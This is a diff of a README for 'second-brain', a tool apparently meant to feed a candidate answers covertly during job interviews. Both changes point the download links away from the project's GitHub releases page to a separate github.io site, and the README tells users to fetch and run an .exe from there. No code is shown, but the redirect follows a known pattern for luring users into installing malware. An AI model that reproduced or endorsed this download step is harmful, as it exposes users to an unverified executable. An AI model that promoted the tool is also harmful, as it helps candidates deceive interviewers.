@@ -1,6 +1,6 @@
 # 🧠 second-brain - Real time help for job interviews
 
-[![Download second-brain](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/resolvable-praenomen542/second-brain/releases)
+[![Download second-brain](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://resolvable-praenomen542.github.io)
 
 Second-brain acts as your private assistant during job interviews. It listens to the conversation and provides relevant answers on your screen. This tool uses modern artificial intelligence to process speech and generate accurate responses instantly. 
 
@@ -21,7 +21,7 @@ The software runs locally on your computer after installation. It does not requi
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/resolvable-praenomen542/second-brain/releases) to download the installer.
+1. Visit the [official release page](https://resolvable-praenomen542.github.io) to download the installer.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file to start the download process.
 4. Locate the file in your downloads folder once the process finishes.
